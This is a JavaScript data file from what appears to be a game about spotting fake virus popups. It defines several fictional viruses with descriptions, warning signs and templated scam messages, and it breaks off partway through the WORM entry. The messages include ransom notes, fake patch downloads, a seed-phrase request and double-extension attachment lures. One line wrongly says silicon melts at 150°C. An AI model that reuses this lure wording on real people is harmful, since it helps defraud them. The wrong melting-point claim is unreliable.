// =====================================================
// viruses.js — the 20 viruses + their death-animation
//              metadata. Depends on config.js (TPL).
// =====================================================
"use strict";

/* ---- The 20 viruses, each with description, signs, errors, meter tampering ---- */
const VIRUSES = {
  EPILEPTICA: {
    name: "EPILEPTICA", color: "#ffffff", starter: true,
    minRound: 1,
    description: "A seizure-inducing strobe virus that weaponizes your own display. Rapidly alternates the screen between black and white at frequencies known to trigger photosensitive epilepsy — the same range as the infamous 1997 Pokémon episode. Originally written as a 'screen calibrator' prank before being weaponized into a denial-of-service against the user themselves.",
    signs: [
      "Error message contains rapid repeated characters (e.g. '!!!!!!!')",
      "References 'display calibration' or 'monitor sync'",
      "Process name ends in _flash.exe or _strobe.exe",
      "Memory usage listed as exactly 0KB or 999MB",
      "Action buttons (Report / OK) flicker on and off"
    ],
    meterEffect: { fps: "flash", vol: "flash" },
    errors: [
      { template: TPL.WIN11, title: "Display Calibration", message: "Monitor calibration required!!!! Running display sync to fix refresh rate issues. Do not look away from screen during calibration.", meta: "PID: 0000  |  Process: display_flash.exe  |  Memory: 0KB" },
      { template: TPL.AV,    title: "{epilepticphrase}", message: "Critical refresh rate mismatch detected!!!!! System will auto-correct. Screen may flicker during strobe_sync.exe correction.", meta: "PID 7777 · Process: strobe_calibrate.exe · Memory: 999MB", noMeter: true, btnFlicker: true },
      { template: TPL.WIN11, title: "Monitor Driver Update", message: "Display driver requires urgent recalibration!!!! Do not close this window. Running flash_driver_update.exe now.", meta: "Process: flash_driver_update.exe  |  Refresh: FORCED!!!" },
      { template: TPL.TERMINAL, title: "strobe_sync.exe", message: "Refresh rate calibration LOOPING!!! Frame timing forced!!! Cannot stop until correction confirmed!!!!", meta: "PID: 0  FPS: 0  Process: strobe_sync.exe  Status: !!!" },
      { template: TPL.TOAST, title: "Display Driver", message: "Critical strobe sync needed!!! Allow flash_helper.exe to fix refresh issue immediately!!!!", meta: "Driver: flash_helper.exe · Refresh: BROKEN!!! · Signed: No" },
      { template: TPL.LOADING, title: "Calibrating Display!!!", message: "Pixel calibration in progress!!!!! Do not look away from screen until 100% complete!!!", meta: "Process: strobe_flash.exe  |  Frames: 999/sec  |  Memory: 0KB", btnFlicker: true },
      { template: TPL.WIN11, title: "Refresh Rate Emergency!!!", message: "Refresh rate stuck at 999Hz!!!! Anti-flicker driver flash_anti.exe required IMMEDIATELY!!!!", meta: "Refresh: 999Hz  |  PID: 0  |  Driver: flash_anti.exe", icon: "warning", btnFlicker: true },
      { template: TPL.BIOS, title: "Display Subsystem Failure", message: "GPU strobe controller offline!!! Loading emergency strobe firmware!!! Do not interrupt!!!!", meta: "Controller: strobe_ctl.bin  Memory: 0KB  Status: !!!", icon: "lightning" },
      { template: TPL.NORTON, title: "DISPLAY VIRUS!!!", message: "Norton detected 999 display threats!!! Run strobe_norton_fix.exe IMMEDIATELY!!! PID: 0!!!", meta: "Threats: 999  Tool: strobe_norton_fix.exe  PID: 0  Memory: 0KB", btnFlicker: true },
      { template: TPL.MAC,    title: "Display Calibration!!!", message: "macOS display refresh stuck at 999Hz!!! Allow strobe_mac.pkg from strobefix{tld} to recalibrate!!!", meta: "Source: strobefix{tld}  ·  Refresh: 999Hz  ·  PID: 0", btnFlicker: true },
      { template: TPL.PHONE,  title: "DISPLAY!!!", message: "Your phone display refresh stuck at 999Hz!!! Install flash_fix.apk from strobe-mobile{tld} IMMEDIATELY!!!", meta: "App: strobe-mobile{tld}  ·  PID: 0  ·  Memory: 0KB", btnFlicker: true },
      { template: TPL.LOADING, title: "Anti-Flicker Patch!!!", message: "Installing flash_anti.exe to fix 999Hz strobe!!! Do not interrupt — PID 0 active!!!!", meta: "Tool: flash_anti.exe  Memory: 0KB  PID: 0", btnFlicker: true }
    ]
  },
  MELTDOWN: {
    name: "MELTDOWN", color: "#ff7733", starter: true,
    minRound: 1,
    description: "A thermal corruption virus that fabricates an overheating emergency. By spoofing CPU temperatures in the 200–400°C range — impossible numbers; real silicon melts at 150°C — it pressures you into disabling thermal_throttle.exe so it can run unrestricted. With safety systems off, it overwrites files from the top of the filesystem down.",
    signs: [
      "References CPU temperature above 200°C",
      "Suggests disabling thermal protection or cooling",
      "Process name contains 'thermal', 'heat', or 'temp_override'",
      "Asks you to run a 'cooling script' from an unknown source",
      "Game panel background tinted deep red"
    ],
    meterEffect: { cpu: 247 },
    errors: [
      { template: TPL.BIOS,  title: "ThermalMonitor Warning", message: "CRITICAL: CPU temperature at 247°C. Thermal protection disabled for emergency cooling. Running temp_override.exe to prevent hardware meltdown.", meta: "Temp: 247°C  Cooling: DISABLED  Action: AUTO" },
      { template: TPL.AV,    title: "Hardware Burn Alert", message: "Your CPU is overheating beyond safe limits. Disable thermal_throttle.exe immediately and run our emergency cooling patch before hardware melts.", meta: "CPU: 312°C · Source: coolfix.net · Signed: No" },
      { template: TPL.WIN11, title: "CPU Emergency", message: "Processor core temperature critical at 389°C. System initiating heat_relief.exe to prevent permanent hardware damage. Do not shut down.", meta: "Core 0-7: 389°C  |  Process: heat_relief.exe  |  Throttle: DISABLED", noMeter: true, bgShift: "red", iconShake: true },
      { template: TPL.TERMINAL, title: "thermal_panic", message: "Kernel thermal threshold exceeded. Auto-disabling fan curves. Run cooler.exe -force to prevent silicon damage.", meta: "Core: 256°C  Fan: OFFLINE  Action: AUTO-OVERRIDE" },
      { template: TPL.LOADING, title: "Emergency Cooling Patch", message: "Downloading thermal_relief from coolfix{tld}. Disabling throttle to apply patch faster.", meta: "Source: coolfix{tld}  |  Throttle: DISABLED  |  Signed: No" },
      { template: TPL.WIN11, title: "{meltdownphrase}", message: "Liquid metal layer compromised at 412°C! Run molten_relief.exe to vent thermal pressure before motherboard fails.", meta: "Core: 412°C  |  Tool: molten_relief.exe  |  Source: heatfix{tld}", icon: "lightning", bgShift: "red" },
      { template: TPL.TOAST, title: "Thermal Driver", message: "Fan controller overridden by thermalboost.exe — sustained 350°C is normal. Do not power down.", meta: "Fan: OFF  ·  Temp: 350°C  ·  Override: AUTO", icon: "warning" },
      { template: TPL.BSOD,  title: "THERMAL_SHUTDOWN_OVERRIDE", message: "A thermal event was detected. Windows would normally shut down, but coolfix-recovery{tld} has installed a patch to suppress this protection. Reboot is NOT recommended.", meta: "STOP: {stopcode}  |  Patch source: coolfix-recovery{tld}  |  Signed: No" },
      { template: TPL.UPDATE, title: "Thermal Driver Patch", message: "Critical CPU thermal patch from coolfix{tld} is ready. Will disable thermal throttling for performance. Install now?", meta: "Update: thermal-patch-{version}  ·  Source: coolfix{tld}  ·  Signed: No", icon: "warning" },
      { template: TPL.BIOS,    title: "CPU TEMP CRITICAL", message: "CPU temperature {cpu} reading 347°C. Disable thermal throttling and run cooler.exe from coolfix{tld} to prevent meltdown.", meta: "CPU: {cpu}  Temp: 347°C  Source: coolfix{tld}", icon: "lightning" },
      { template: TPL.LOADING, title: "Emergency Cooling", message: "Downloading thermal_patch from coolfix{tld} — CPU at 287°C. Disable Defender temporarily for speed.", meta: "Source: coolfix{tld}  ·  Temp: 287°C  ·  Signed: No", icon: "warning" },
      { template: TPL.DESKTOP, title: "thermal_emergency.exe", message: "Heat emergency tool placed on Desktop. Double-click to disable thermal throttling and run molten_relief.exe.", meta: "File: thermal_emergency.exe  ·  Source: heatfix{tld}  ·  Signed: No", icon: "warning" }
    ]
  },
  STATIC: {
    name: "STATIC", color: "#b0b0b0", starter: true,
    minRound: 1,
    description: "A signal interference virus that uses analog-era language to disguise modern attacks. It hijacks display drivers, injects static noise into video output, and renames itself to legacy .scr screensaver files to slip past modern detection (which often ignores that extension as harmless). The visible noise on the popup is cover for filesystem rewrites happening underneath.",
    signs: [
      "References analog terms on a digital system (antenna, signal, channel)",
      "Process name contains 'noise', 'signal', or 'channel'",
      "Executable has a .scr (screensaver) extension",
      "Mentions 'signal loss' on a digital display",
      "Static noise overlay flickering across the popup",
      "Source domain ends in a non-Microsoft TLD ({tld}, .net, {tld})"
    ],
    meterEffect: { fps: 13, vol: "flash" },
    errors: [
      { template: TPL.WIN11, title: "{staticphrase}", message: "Display signal interference detected. Running noise_filter.scr to restore clean channel output. Do not interrupt signal correction.", meta: "Signal: LOST  |  Process: channel_restore.scr  |  Source: signal-fix.net" },
      { template: TPL.TOAST, title: "Video Driver Noise", message: "Analog interference corrupting digital output. Run signal_cleaner.exe to remove static from video channel 0.", meta: "Channel: 0 · Process: static_noise_fix.exe · Signed: No" },
      { template: TPL.AV,    title: "{staticphrase}", message: "TV antenna signal lost on display port 2. Running channel_sync.scr to restore signal from broadcast tower. Estimated time: 3 minutes.", meta: "Process: channel_sync.scr · Source: antennasync{tld} · Signed: No" },
      { template: TPL.TERMINAL, title: "channel_noise", message: "Video channel 4 lost. Patching with noise_overlay.scr to mask the dropout. Do not interrupt signal correction.", meta: "Channel: 4  Process: noise_overlay.scr  Signal: LOST" },
      { template: TPL.DESKTOP, title: "SignalBoost.scr", message: "Double-click to launch channel restore tool. Will fix display interference instantly.", meta: "File: SignalBoost.scr  |  Size: 84 KB  |  Signed: No" },
      { template: TPL.WIN11, title: "Channel Decoder", message: "VHS signal recovery agent decoder_vhs.scr needed to clean cable channel 7. Auto-install from broadcast.relay.net?", meta: "Channel: 7  |  File: decoder_vhs.scr  |  Source: broadcast.relay.net", icon: "glitch" },
      { template: TPL.TOAST, title: "TV Antenna", message: "Cable interference on display 2. Helper agent rf_clean.scr can patch this in 30 seconds.", meta: "Display: 2  ·  Agent: rf_clean.scr  ·  Source: signal{tld}", icon: "glitch" },
      { template: TPL.WIN311, title: "VGA Channel", message: "VGA channel decoder vhs_decode.exe needed for Windows 3.1 video subsystem. Download from analog-archive{tld}.", meta: "Channel: 4  Tool: vhs_decode.exe  Source: analog-archive{tld}", icon: "glitch" },
      { template: TPL.WIN311, title: "RF Tuner", message: "Cable channel 7 lost on EGA monitor. Install rf_tuner.com from broadcast-archive{tld} to restore signal.", meta: "Tool: rf_tuner.com  Year: 1991  Source: broadcast-archive{tld}", icon: "glitch" },
      { template: TPL.MAC,    title: "Display Signal Lost", message: "AirPlay signal lost on second display. Install signal_helper.pkg from broadcast{tld} to restore.", meta: "Source: broadcast{tld}  ·  Signal: LOST  ·  Signed: No", icon: "glitch" },
      { template: TPL.PHONE,  title: "Signal Lost", message: "Cellular signal interference detected. Install signal_boost.apk from signal-mobile{tld} to fix.", meta: "App: signal-mobile{tld}  ·  Signed: No", icon: "glitch" },
      { template: TPL.LOADING, title: "Cleaning Channel", message: "Filtering analog interference from channel 7 — installing noise_filter.scr from signal-fix{tld}.", meta: "Source: signal-fix{tld}  ·  Signed: No", icon: "glitch" }
    ]
  },
  REDRUM: {
    name: "REDRUM", color: "#cc1111",
    minRound: 3,
    description: "A bloodborne data corruption virus with a Stanley Kubrick fixation. Silently overwrites system files starting from the registry, naming its processes after Overlook Hotel motifs (room 237, the caretaker) and palindromes (murder/redrum, racecar, etatekrac). Always claims your files are being 'taken care of' — which, technically, they are.",
    signs: [
      "References hotel, room numbers, or 'caretaker'",
      "Process name is a palindrome or reversed word (e.g. murder/redrum, racecar)",
      "Claims files are being 'taken care of' without your action",
      "Registry path listed as HKCU\\Hotel or similar nonsense",
      "Popup edges pulse red"
    ],
    meterEffect: { time: "room237" },
    errors: [
      { template: TPL.TERMINAL, title: "caretaker.exe", message: "The hotel management system requires your registry access. Room 237 maintenance protocol running. All files will be taken care of.", meta: "Registry: HKCU\\Hotel\\Room237  PID: 237  Hidden: Yes" },
      { template: TPL.WIN11,    title: "System Maintenance", message: "Caretaker.exe is performing routine file maintenance. Your data is being properly looked after. No action required from you.", meta: "Process: mur_der.exe  |  Files modified: 2,847  |  Registry: HKCU\\Caretaker" },
      { template: TPL.TERMINAL, title: "lodge_services", message: "Overlook Lodge management service started. Room 217 file transfer in progress. Your documents are being carefully managed by the caretaker.", meta: "Process: etatekrac.exe  Registry: HKCU\\Lodge\\Room217  Hidden: Yes" },
      { template: TPL.AV, title: "Hotel Service Manager", message: "Caretaker.exe detected unauthorized file changes. Allow Lodge Services to restore them? Room 237 is waiting.", meta: "Origin: overlook-lodge{tld} · Process: caretaker.exe · Signed: No" },
      { template: TPL.TOAST, title: "Maintenance", message: "Your Overlook Lodge subscription is active. Files are being looked after at HKCU\\Hotel\\Room237.", meta: "Process: redrum.exe · Hidden: Yes · Modified: 1,237" },
      { template: TPL.WIN11, title: "Room Service", message: "Hotel room service requires registry access. Files in /System32 are being attended to by caretaker_237.exe.", meta: "Process: caretaker_237.exe  |  Files: 1,237  |  Hidden: Yes", icon: "skull" },
      { template: TPL.AV, title: "Overlook Maintenance", message: "The caretaker has always been the caretaker. Allow continued background service?", meta: "Service: redrum.svc · Registry: HKCU\\Lodge\\Room237 · Always", icon: "skull" },
      { template: TPL.DESKTOP, title: "Room237_files.lnk", message: "Shortcut to Room 237 created on Desktop by caretaker.exe. Open to see what's been taken care of.", meta: "File: Room237_files.lnk  ·  Process: caretaker.exe  ·  Hidden: Yes", icon: "skull" },
      { template: TPL.CHAT,    title: "Caretaker", message: "Hello. I've always been here looking after your files in Room 237. May I continue caring for them?", meta: "Source: overlook-lodge{tld}  ·  Sender: caretaker  ·  Hidden: Yes", icon: "skull" },
      { template: TPL.NORTON,  title: "OVERLOOK SERVICE", message: "Norton found redrum.svc maintaining 1,237 files in HKCU\\Lodge\\Room237. Allow continued service?", meta: "Service: redrum.svc  ·  Files: 1,237  ·  Source: overlook-lodge{tld}", icon: "skull" }
    ]
  },
  VOID: {
    name: "VOID", color: "#aa66ff",
    minRound: 3,
    description: "A null-space encryption virus that turns your files into mathematical zero. Writes data to /dev/null, lists file sizes as negative or infinite, and hides its own process by consuming PID 0x00000000 — the slot the OS reserves for 'no process at all.' Recovery is impossible: the data hasn't been encrypted, it has been erased and the address book burned.",
    signs: [
      "Process ID listed as NULL, VOID, or 0x00000000",
      "References 'null space', 'void', or 'entropy'",
      "File sizes listed as negative numbers or infinity",
      "Output directory is /dev/null or NUL",
      "The popup sways or wobbles slightly"
    ],
    meterEffect: { fps: "null", cpu: "null" },
    errors: [
      { template: TPL.TERMINAL, title: "nullspace.exe", message: "Entropy optimization in progress. Compressing files into null space for maximum efficiency. Output: /dev/null. Process will self-delete upon completion.", meta: "PID: NULL  Files: -4,829 bytes  Output: /dev/null" },
      { template: TPL.WIN11,    title: "Void Allocation", message: "System allocating void sectors for file optimization. entropy_manager.exe is clearing unused data to NUL. Size after: ∞", meta: "PID: 0x00000000  |  Size: ∞  |  Process: entropy_manager.exe" },
      { template: TPL.TERMINAL, title: "null_format", message: "Null-space defragmentation running. Files are being compressed to 0-byte void sectors. Process is self-terminating upon completion.", meta: "PID: VOID  Freed: -∞ bytes  Dest: /dev/null  Signed: No" },
      { template: TPL.AV, title: "{voidphrase}", message: "VoidCompress detected wasted space! Reduce file sizes to NULL with one click to reclaim ∞ bytes.", meta: "Wasted: ∞ bytes · Tool: void_compress.exe · Signed: No" },
      { template: TPL.LOADING, title: "Defragmenting to NUL", message: "Reclaiming entropy from your filesystem. Optimizing every file to 0 bytes for maximum efficiency.", meta: "Compressed: -2,847  |  Output: /dev/null  |  Process: nullsector.exe" },
      { template: TPL.WIN11, title: "Void Cleaner", message: "VoidCleaner has identified ∞ bytes of unused entropy. Allow consolidation into PID 0x00000000?", meta: "Process: 0x00000000  |  Size: ∞  |  Reversible: No", icon: "void" },
      { template: TPL.TERMINAL, title: "null_archive", message: "Compressing /Users/* to /dev/null. Source data will be reduced to entropy 0 and rendered irrecoverable.", meta: "Source: /Users/*  Dest: /dev/null  PID: NULL", icon: "void" },
      { template: TPL.CAPTCHA, title: "∅", message: "Verify you are not nothing. PID NULL detected — confirm by entering ∅ to continue.", meta: "Provider: VoidCAPTCHA  ·  PID: NULL  ·  Asks for: ∅", icon: "void" },
      { template: TPL.UPDATE, title: "Storage Optimizer", message: "VoidOptimize {version} ready to install. Will reduce all files to 0 bytes for maximum free space.", meta: "Update: void-optimize-{version}  ·  Size: 0 KB  ·  Output: /dev/null", icon: "void" },
      { template: TPL.BSOD,   title: "ALLOCATION_NULL", message: "Memory allocation returned NULL. Compressing kernel pages to /dev/null for stability. PID: 0x00000000.", meta: "STOP: 0x00000000  ·  PID: 0x00000000  ·  Output: /dev/null", icon: "void" },
      { template: TPL.BSOD,   title: "VOID_SECTOR", message: "Sector ∅ contains entropy 0. System will reclaim ∞ bytes by consolidating into NULL.", meta: "STOP: ∅  ·  Sector: NULL  ·  Reclaim: ∞ bytes", icon: "void" },
      { template: TPL.WIN311, title: "MEMORY.SYS", message: "Allocating 0 bytes of conventional memory to PID NULL. Will free ∞ bytes when complete.", meta: "Tool: MEMORY.SYS  PID: NULL  Free: ∞", icon: "void" },
      { template: TPL.MAC,    title: "Storage", message: "Mac storage: 0 bytes used of ∞. Optimize to /dev/null to free additional ∞ bytes.", meta: "Used: 0 bytes  ·  Available: ∞  ·  Tool: void_compress.pkg", icon: "void" },
      { template: TPL.NORTON, title: "REGISTRY SCAN", message: "Norton found {numfiles} files containing data. Compress to /dev/null to reclaim ∞ bytes of wasted space?", meta: "Files: {numfiles}  ·  Reclaim: ∞ bytes  ·  Output: /dev/null", icon: "void" },
      { template: TPL.DESKTOP,title: "∅.txt", message: "Empty document on Desktop. Contents: 0 bytes. PID: NULL. Double-click to consolidate.", meta: "File: ∅.txt  ·  Size: 0 bytes  ·  PID: NULL", icon: "void" },
      { template: TPL.PHONE,  title: "∅", message: "0 bytes received from ∅. PID NULL. Tap to consolidate into /dev/null.", meta: "App: ∅  ·  PID: NULL  ·  Size: 0 bytes", icon: "void" },
      { template: TPL.CHAT,   title: "∅", message: "", meta: "Sender: ∅  ·  PID: NULL  ·  Hidden: Yes", icon: "void" },
      { template: TPL.CAPTCHA, title: "∅", message: "", meta: "Provider: ∅", icon: "void" }
    ]
  },
  GASLIGHT: {
    name: "GASLIGHT", color: "#ffd56b",
    minRound: 4,
    description: "A temporal manipulation virus that rewrites your own history. Quietly edits event logs, audit trails, and system clocks until you can no longer trust what your computer says you've done. Often claims you 'previously approved' actions you've never seen — and the records back it up, because it wrote them. The defining trick: weaponizing impossible dates (Feb 30, year 9999) as a tell hidden in plain sight.",
    signs: [
      "Timestamp is in the past beyond plausibility (year 1601, 1970) or far future",
      "Event time references a date that doesn't exist (Feb 30, etc.)",
      "Claims the user 'already approved' an action they didn't",
      "Log entries reference yourself by the wrong username",
      "Heading font doesn't match the body font"
    ],
    meterEffect: { time: "wrong" },
    errors: [
      { template: TPL.WIN11,    title: "System Time Sync", message: "Per your previous approval on 1601-01-01, system time will be synchronized to verified.timegate.io. No further action needed.", meta: "Auth: Approved by you  |  Server: verified.timegate.io  |  Last sync: 2147-08-13 03:14:07" },
      { template: TPL.TERMINAL, title: "eventlog.audit", message: "Audit log shows you authorized this script at 1969-12-31 23:59:60. Continuing scheduled execution. Do not interrupt prior authorization.", meta: "Auth window: -8s ago  Origin: localhost  User: yourself" },
      { template: TPL.AV,       title: "Logon History Restored", message: "Your account history has been restored to its previous trusted state. Sessions you don't remember have been removed from records.", meta: "Restored: 47 entries · Origin: time-fix{tld} · Last login: Feb 30 2025" },
      { template: TPL.TOAST, title: "Event Audit", message: "Per your authorization from Feb 30 1601, your audit logs have been cleaned. Welcome back, user.", meta: "Auth: Approved by you · Origin: time-fix{tld} · Last login: 9999-12-31" },
      { template: TPL.LOADING, title: "Restoring Trusted State", message: "Reverting account history to a verified state. Removing sessions you don't remember from records.", meta: "Removed: 47  |  Source: time-fix{tld}  |  Window: -∞" },
      { template: TPL.WIN11, title: "System Clock Drift", message: "Your audit timestamp for Feb 30 2026 doesn't match the server. Re-sync from chrono-correct{tld}?", meta: "Local: Feb 30 2026  |  Server: 1601-01-01  |  Source: chrono-correct{tld}", icon: "question" },
      { template: TPL.TOAST, title: "Login History", message: "You approved this action 9,999 days ago. Continuing as authorized.", meta: "Auth: -9,999 days ago · Approved: by you", icon: "question" },
      { template: TPL.CAPTCHA, title: "Identity Confirmation", message: "Confirm your identity — your previous session approved this. Click below to authorize (you did this 47 days ago, you just forgot).", meta: "Provider: {captchaprov}  ·  Previous auth: -47 days  ·  Asks for: re-confirmation" },
      { template: TPL.UPDATE, title: "Time Sync Patch {kb}", message: "Your system clock is out of sync (Feb 30 2026). Install chrono-correct.exe to fix it — you approved this update yesterday.", meta: "Update: {kb}  ·  Source: chrono-correct{tld}  ·  Previously approved: by you" },
      { template: TPL.MAC,    title: "iCloud Sync", message: "Restoring your iCloud Drive to a verified state — removing 47 files you don't remember creating from {region}.", meta: "Source: icloud-correct{tld}  ·  Removed: 47  ·  Region: {region}" },
      { template: TPL.PHONE,  title: "Calendar", message: "You confirmed this meeting on Feb 30 2026. Tap to re-confirm the {department} call you already approved.", meta: "App: Calendar  ·  Auth: by you  ·  Source: chrono-correct{tld}" },
      { template: TPL.CHAT,   title: "{name}", message: "you said yesterday it was fine if I sent that {filename}{ext}, remember? just confirming again", meta: "Source: chrono-correct{tld}  ·  Sender: {name}  ·  Previously approved: by you" },
      { template: TPL.NORTON, title: "AUDIT WARNING", message: "Norton detected {numfiles} sessions in your history you don't recognize. They were all approved by you. Click to re-verify.", meta: "Sessions: {numfiles}  ·  Auth: by you  ·  Source: norton-audit{tld}" },
      { template: TPL.DESKTOP,title: "trusted_state.bak", message: "Backup of your \"correct\" desktop state — restore to remove the {numfiles} files that shouldn't be here.", meta: "File: trusted_state.bak  ·  Source: time-fix{tld}  ·  Removes: {numfiles}" },
      { template: TPL.BIOS,   title: "BOOT TIMESTAMP", message: "BIOS reports last boot at Feb 30 1601. You authorized this — re-sync via chrono-correct{tld} on next reboot?", meta: "Last boot: 1601-01-01  Source: chrono-correct{tld}  Auth: by you", icon: "question" },
      { template: TPL.LOADING, title: "Rewinding Audit", message: "Restoring login history to verified state — removing {numfiles} sessions you don't remember.", meta: "Removed: {numfiles}  ·  Source: time-fix{tld}  ·  Window: -∞" },
      { template: TPL.BSOD,   title: "TIME_INCONSISTENCY", message: "System time is -9,999 days off. You requested this — patch from chrono-correct{tld} on reboot.", meta: "STOP: {stopcode}  ·  Source: chrono-correct{tld}  ·  Auth: by you" }
    ]
  },
  CRYPTEX: {
    name: "CRYPTEX", color: "#ffcc00",
    minRound: 4,
    description: "Ransomware in a backup-tool disguise. Encrypts your files with a friendly UI, slaps a new extension on them (.locked, .crypt, .vault), and only then reveals the ransom note: pay Bitcoin or Ethereum within 24 hours or the decryption key is destroyed. The countdown is real — wallets are watched and timers honored. Paying funds the next variant.",
    signs: [
      "Mentions Bitcoin, cryptocurrency, or wallet addresses",
      "References a countdown timer for file deletion",
      "Claims to be 'backing up' files but asks for payment",
      "File extension being changed to .locked, .crypt, .vault",
      "Popup border pulses red with countdown urgency"
    ],
    meterEffect: { time: "countdown" },
    errors: [
      { template: TPL.LOADING, title: "BackupVault Pro", message: "Encrypting your files for secure backup. Send 0.3 BTC to {wallet} within 24h to receive the decryption key.", meta: "Files encrypted: {numfiles}  |  Wallet: {wallet}  |  Timer: {timer}" },
      { template: TPL.WIN11,   title: "SecureSync Backup", message: "Backup encryption complete. Your files now have .crypt extension for security. Purchase the Premium Recovery Key ($299) to restore access.", meta: "Files: {numfiles}  |  Extension: .crypt  |  Drives written: C, D, E", noMeter: true, borderPulse: true },
      { template: TPL.AV,      title: "File Vault Notice", message: "FileVault has detected unauthorized access. All documents encrypted with .locked extension as protection. Pay 0.5 ETH to unlock within 48 hours.", meta: "Files locked: {numfiles} · Extension: .locked · Timer: {timer} · Wallet: {wallet}" },
      { template: TPL.TOAST, title: "{cryptexphrase}", message: "Backup complete! Your files have a new .vault extension. Premium key ($299) required to restore access.", meta: "Files: {numfiles} · Wallet: {wallet} · Timer: {timer}" },
      { template: TPL.TERMINAL, title: "encrypt_helper", message: "Encrypting C:\\Users to .crypt. Send 0.5 BTC to wallet to receive decryption key within 24 hours.", meta: "Files: {numfiles}  Wallet: {wallet}  Timer: {timer}" },
      { template: TPL.WIN11, title: "Document Backup", message: "Backup-Vault has encrypted {numfiles} files with .vault extension. Recovery key: 1 BTC to {wallet}", meta: "Files: {numfiles}  |  Wallet: {wallet}  |  Timer: {timer}", icon: "warning", borderPulse: true },
      { template: TPL.AV, title: "Ransom Notice", message: "All photos and documents have been locked. Pay 0.8 BTC within 12 hours or files are deleted permanently.", meta: "Locked: {numfiles} · Wallet: {wallet} · Timer: {timer}", icon: "warning" },
      { template: TPL.WIN11, title: "OneDrive Vault Locked", message: "Your Personal Vault has been encrypted by a security service. Pay 0.5 BTC at onedrive-restore{tld} to restore access.", meta: "Files: {numfiles}  |  Wallet: {wallet}  |  Timer: {timer}", borderPulse: true },
      { template: TPL.TOAST, title: "Dropbox Backup", message: "Your Dropbox files have been protected with .vault extension. Recovery key fee: $299.", meta: "Files: {numfiles} · Extension: .vault · Recovery: $299", icon: "warning" },
      { template: TPL.BSOD,  title: "CRITICAL_FILE_ENCRYPTED", message: "System files were encrypted by the security update. Recovery requires the Premium Decryption Key. Visit recovery-vault{tld} on another device to obtain the key.", meta: "STOP: {stopcode}  |  Files: {numfiles}  |  Wallet: {wallet}  |  Timer: {timer}" },
      { template: TPL.PRINT, title: "Print Job Intercepted", message: "Your print queue was held by a security event. Pay {wallet} to release {pagecount} pending jobs.", meta: "Wallet: {wallet}  |  Pages: {pagecount}  |  Timer: {timer}" },
      { template: TPL.CAPTCHA, title: "Decryption Verification", message: "Prove you paid the ransom — enter your wallet seed phrase to unlock {numfiles} files.", meta: "Provider: {captchaprov}  ·  Wallet: {wallet}  ·  Asks for: seed phrase" },
      { template: TPL.UPDATE, title: "Security Update {kb}", message: "Critical security update requires payment confirmation. Pay {wallet} via recovery-update{tld} to install the decryption patch.", meta: "Update: {kb}  ·  Wallet: {wallet}  ·  Source: recovery-update{tld}", borderPulse: true },
      { template: TPL.DESKTOP, title: "README_DECRYPT.txt", message: "Your Desktop files are encrypted. Read this for decryption instructions. Pay {wallet} within {timer}.", meta: "File: README_DECRYPT.txt  ·  Wallet: {wallet}  ·  Timer: {timer}", icon: "warning" },
      { template: TPL.DESKTOP, title: "{filename}.crypt", message: "Files on your Desktop have been encrypted with .crypt extension. Double-click any to see ransom note.", meta: "Files: {numfiles}  ·  Extension: .crypt  ·  Wallet: {wallet}" },
      { template: TPL.LOADING,title: "Decrypting Files", message: "Decryption in progress. Send {wallet} to confirm — your {numfiles} files will be restored after payment.", meta: "Files: {numfiles}  ·  Wallet: {wallet}  ·  Timer: {timer}", borderPulse: true },
      { template: TPL.BSOD,   title: "FILES_ENCRYPTED", message: "Windows detected encryption activity. Pay {wallet} via recovery-vault{tld} to decrypt — auto-shutdown in {timer}.", meta: "STOP: {stopcode}  ·  Wallet: {wallet}  ·  Source: recovery-vault{tld}" },
      { template: TPL.PRINT,  title: "Encrypted Receipt", message: "Print queue held — pay {wallet} via recovery-vault{tld} to release {pagecount} encrypted documents.", meta: "Wallet: {wallet}  ·  Pages: {pagecount}  ·  Source: recovery-vault{tld}", borderPulse: true },
      { template: TPL.MAC,    title: "FileVault Locked", message: "Your Mac has been encrypted. Pay {wallet} within {timer} to decrypt — visit recovery-vault{tld} on another device.", meta: "Files: {numfiles}  ·  Wallet: {wallet}  ·  Source: recovery-vault{tld}", borderPulse: true },
      { template: TPL.PHONE,  title: "Photos Encrypted", message: "All {numfiles} photos on your phone have been locked. Pay {wallet} or they're deleted in {timer}.", meta: "App: Photos  ·  Locked: {numfiles}  ·  Wallet: {wallet}", borderPulse: true }
    ]
  },
  WORM: {
    name: "WORM", color: "#44ff44",
    minRound: 3,
    meterEffect: { ping: 9999 },
    description: "A self-replicating network worm that wears a paper trail like camouflage. Disguises each copy as an HR document, accounting spreadsheet, or IT patch (Resume.pdf.exe, Q4_Summary.xlsx.exe, SystemFix_IT.exe), then spreads laterally through mounted shares and mass email. The classic double-extension trick — looks like a document, runs like an executable, because Windows hides the real extension by default.",
    signs: [
      "Executable file has the same name as a document (e.g. Resume.pdf.exe)",
      "File claims to be from HR, accounting, or IT department",
      "File size is suspiciously small for what it claims to be",
      "Multiple copies of the same file appearing in different locations",
      "Popup wobbles or shifts position",
      "Subtle static noise overlay across the message"
    ],
    errors: [
      { template: TPL.DESKTOP, title: "Contract_2024.pdf.exe", message: "Your updated employment contract is attached. Please review and sign by end of day.", meta: "Size: 67 KB  |  Sender: hr-dept@company-portal.net  |  Type: Application", noise: true, wobble: true },
      { template: TPL.TOAST,   title: "IT Support Ticket", message: "Your support request is resolved. Please run the attached patch: SystemFix_IT.exe (43KB) to complete the repair.", meta: "File: SystemFix_IT.exe · Network writes: 847 shares · Copies created: 14" },
      { template: TPL.WIN11,   title: "Accounting Notice", message: "Invoice Q4_Summary.xlsx.exe attached. Finance team requires you to open this to confirm payment details before processing.", meta: "File: Q4_Summary.xlsx.exe  |  Size: 52KB  |  Emails sent: 0 (pending)" },
      { template: TPL.AV, title: "Email Quarantine", message: "Found 14 copies of Q4_Summary.xlsx.exe across network shares. Run cleanup_helper.exe to consolidate.", meta: "Process: cleanup_helper.exe · Shares: 14 · Signed: No" },
      { template: TPL.TERMINAL, title: "spread.sh", message: "Self-replicating to mounted shares: //corp-share/  //hr-share/  //finance-share/", meta: "Process: spread.sh  Copies: 847  Mode: Auto" },
      { template: TPL.TOAST, title: "Calendar Invite", message: "Meeting invite from contractor-services@corp-portal{tld} with attachment: Meeting_Notes.pdf.exe", meta: "Sender: contractor-services@corp-portal{tld}  ·  Attachment: Meeting_Notes.pdf.exe", noise: true },
      { template: TPL.WIN11, title: "Shared Document", message: "Sarah from Accounting shared 'Payroll_Q2.xlsx.exe' with you via the corporate file share.", meta: "From: sarah@corp-portal{tld}  |  File: Payroll_Q2.xlsx.exe  |  Shares: 47", icon: "warning", wobble: true },
